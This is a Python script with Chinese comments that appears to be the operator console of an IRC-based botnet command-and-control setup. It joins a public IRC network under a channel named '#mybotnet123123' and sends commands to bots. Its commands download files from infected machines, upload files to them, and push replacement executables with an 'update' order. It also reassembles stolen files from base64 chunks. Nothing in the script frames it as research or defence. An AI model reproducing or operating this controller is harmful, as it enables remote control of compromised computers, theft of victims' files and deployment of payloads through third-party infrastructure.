import socket
import re
import threading
import time
import os
import base64
import sys
import hashlib

# 配置参数
SERVER = "irc.libera.chat"  # IRC 服务器地址
PORT = 6667                 # 端口号
NICK = "master919"          # 客户端自身昵称（需唯一）
TARGET = "#mybotnet123123"         # 目标接收者（机器人昵称或频道，例如 "#channel"）
CHANNEL = "#mybotnet123123"           # 频道名称（可选）
ENCODING = "utf-8"          # 编码方式
mb = None




class ReceivedFile:
    def __init__(self):
        self.filename = ""              # 文件名
        self.size = 0                   # 文件大小
        self.b64_content = ""           # Base64 缓存
        self.expected_hash = ""         # 存储期望的 SHA256 值

current_file = ReceivedFile()

class MessageBuffer:
    def __init__(self, target):
        self.buffer = ""
        self.length = 0
        self.target = target
        self.last_send_time = time.time()
        self.max_length = 400      # 实际可用长度（预留 PRIVMSG 命令头尾）
        self.send_interval = 1  # 发送间隔（秒）

    def append(self, message):
        """ 添加消息到缓冲区，自动处理超长行 """
        lines = self.split_long_message(message)
        for line in lines:
            self._append_line(line)

    def _append_line(self, message):
        """ 内部逻辑：添加一行内容到缓冲区 """
        msg_len = len(message)
        new_len = self.length + msg_len + (1 if self.buffer else 0)

        now = time.time()
        if new_len >= self.max_length or (now - self.last_send_time) > 5:
            self.flush()

        if self.buffer:
            self.buffer += "\n"
            self.length += 1

        self.buffer += message
        self.length += msg_len
        self.last_send_time = now

    def split_long_message(self, message):
        """ 拆分超长消息，确保每条不超过 max_length """
        chunks = []
        while message:
            chunk = message[:self.max_length]
            message = message[self.max_length:]
            chunks.append(chunk)
        return chunks

    def flush(self):
        """ 强制发送当前缓冲区内容 """
        if not self.buffer:
            return

        # 替换内部换行符为空格（IRC 协议限制）
        escaped = self.buffer.replace("\n", " ")

        # 构造 IRC PRIVMSG 命令
        cmd = f"PRIVMSG {self.target} :{escaped}\r\n"

        global sock
        sock.send(cmd.encode(ENCODING))
        print(f"[+] Sent to {self.target}: {escaped}")

        # 清空缓冲区
        self.buffer = ""
        self.length = 0
        self.last_send_time = time.time()

        # 控制发送频率
        time.sleep(self.send_interval)



def irc_client():
    global sock
    # 创建 socket 连接
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER, PORT))
    
    # 发送 IRC 协议命令：注册昵称、设置用户信息
    sock.send(f"NICK {NICK}\r\n".encode(ENCODING))
    sock.send(f"USER {NICK} 0 * :Python IRC Client\r\n".encode(ENCODING))
    
    # 加入频道并等待确认
    sock.send(f"JOIN {CHANNEL}\r\n".encode(ENCODING))
    
    # 启动接收消息线程
    receive_thread = threading.Thread(target=receive_messages)
    receive_thread.daemon = True
    receive_thread.start()
    
    # 启动发送线程
    send_thread = threading.Thread(target=send_messages_direct)
    send_thread.daemon = True
    send_thread.start()
    
    # 保持主线程运行
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\nExiting client...")
        sock.close()
        exit()

def receive_messages():
    global file_upload_ack
    try:
        while True:
            data = sock.recv(4096)
            data = data.decode('gbk', errors="ignore")
            # print(data)
            
            # 处理 PING/PONG
            if data.startswith("PING"):
                pong = data.replace("PING", "PONG", 1)
                sock.send(pong.encode(ENCODING))
                continue


            lines = data.splitlines()
            for line in lines:
                if not line.strip():
                    continue

                # 解析 PRIVMSG 消息
                privmsg_match = re.match(r"^:([^!]+)!.*? PRIVMSG (\S+) :(.*)$", line.strip())
                if privmsg_match:
                    sender = privmsg_match.group(1)
                    target = privmsg_match.group(2)
                    message = privmsg_match.group(3)

                    # 还原消息格式
                    restored_message = re.sub(r"    ", "\n", message)

                    if message.startswith("upload "):
                        receive_file(message)

                    # 分割每一行并清理开头空格
                    cleaned_lines = [l.lstrip() for l in restored_message.splitlines() if l.strip()]
                    print(f"From {sender} (Target: {target}):")
                    for line in cleaned_lines:
                        print(line)

                    continue

                



                # 处理 NAMES 响应
                if "353" in line:  # RPL_NAMREPLY
                    parts = line.split(":", 2)
                    if len(parts) >= 3:
                        names = parts[2].split()
                        print("[Members]:", end=" ")
                        print(" ".join(names))

                if "433" in line:  # ERR_NICKNAMEINUSE
                    print("[Error]: Nickname already in use.")
                
                elif "366" in line:  # RPL_ENDOFNAMES
                    print("[Query complete]")
                    
    except Exception as e:
        print(f"Error: {e}")
        sock.close()

def send_messages_direct():
    global TARGET, mb
    try:
        # 初始化 MessageBuffer
        if mb is None:
            mb = MessageBuffer(TARGET)

        while True:
            user_input = input("> ").strip()

            if user_input.lower() == "/quit":
                print("Exiting client...")
                sock.close()
                exit()

            elif user_input.lower().startswith("/send "):
                new_target = user_input.split(" ", 1)[1].strip()
                mb.flush()
                TARGET = new_target
                mb.target = TARGET
                print(f"[+] Sending target changed to: {TARGET}")
                continue

            elif user_input.lower().startswith("/upload "):
                file_path = user_input.split(" ", 1)[1].strip()
                if os.path.exists(file_path):
                    send_file(file_path)
                else:
                    print(f"[!] File not found: {file_path}")
                continue

            elif user_input.lower().startswith("/download "):
                path = user_input.split(" ", 1)[1].strip()
                mb.append(f"download {path}")
                mb.flush()
                continue

            elif user_input == "/names":
                sock.send(f"NAMES {CHANNEL}\r\n".encode(ENCODING))
                print(f"[+] Sent: NAMES {CHANNEL}")
                continue

            elif user_input.lower().startswith("/update "):
                exe_path = user_input.split(" ", 1)[1].strip()
                print(f"[+] Sending updated version.")
                send_file(exe_path)
                print(f"[+] Update request sent.")
                mb.append("update")
                mb.flush()
                continue


            # 添加内容到缓冲区
            mb.append(user_input)

            # 强制发送剩余内容
            mb.flush()

    except Exception as e:
        print(f"Error: {e}")
        sock.close()

def wait_for_ack(ack_signal):
    while ack_signal == 0:
        time.sleep(1)
        print("[+] Waiting for ACK...")

    print("[+] ACK received.")
    ack_signal = 0

def print_progress(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█'):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}\n')
    sys.stdout.flush()
    # 当完成时换行
    if iteration == total: 
        print()

def send_file(path):
    global file_upload_ack
    filename = os.path.basename(path)
    with open(path, "rb") as f:
        file_data = f.read()
        sha256_hash = hashlib.sha256(file_data).hexdigest()
        data = base64.b64encode(file_data).decode()
    
    
    # 发送 UPLOADSTART，包含传输ID
    mb.append("upload")
    mb.append("UPLOADSTART")
    mb.append(f"FILENAME:{filename}")
    mb.append(f"SIZE:{os.path.getsize(path)}")
    mb.flush()

    # 分块发送 DATA
    chunk_size = 300
    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        
        current_chunk = (i // chunk_size) + 1
        print_progress(current_chunk, total_chunks, prefix='Progress:', suffix='Complete', length=50)

        mb.append("upload")
        mb.append(f"DATA:{data[i:i+chunk_size]}")
        mb.flush()



    # 发送 HASH 校验值
    mb.append("upload")
    mb.append(f"HASH:{sha256_hash}")
    mb.flush()

    # 发送 UPLOADEND
    mb.append("upload")
    mb.append("UPLOADEND")
    mb.flush()


def receive_file(line):
    global current_file
    key = line.split(" ", 1)[1]
    if key == "UPLOADSTART":

        print("[+] Receive file started.")

    elif key.startswith("FILENAME"):
        current_file.filename = line.split(":", 1)[1]
    
    elif key.startswith("SIZE"):
        current_file.size = line.split(":", 1)[1]
    
    elif key.startswith("DATA"):
        current_file.b64_content += line.split(":", 1)[1]
        print(len(current_file.b64_content)/(1.33*current_file.size))


    elif key.startswith("HASH"):
        current_file.expected_hash = line.split(":", 1)[1]
    
    elif key == "UPLOADEND":
        current_file.b64_content = current_file.b64_content.rstrip()
        decoded_data = base64.b64decode(current_file.b64_content)
        calculate_hash = hashlib.sha256(decoded_data).hexdigest()
        if calculate_hash == current_file.expected_hash:
            print("[+] File hash verified.")
            with open(current_file.filename, "wb") as f:
                f.write(decoded_data)
            print(f"[+] File saved as: {current_file.filename}")
        else:
            print("[!] File hash verification failed.")


        




if __name__ == "__main__":
    print("Starting IRC client...")
    irc_client()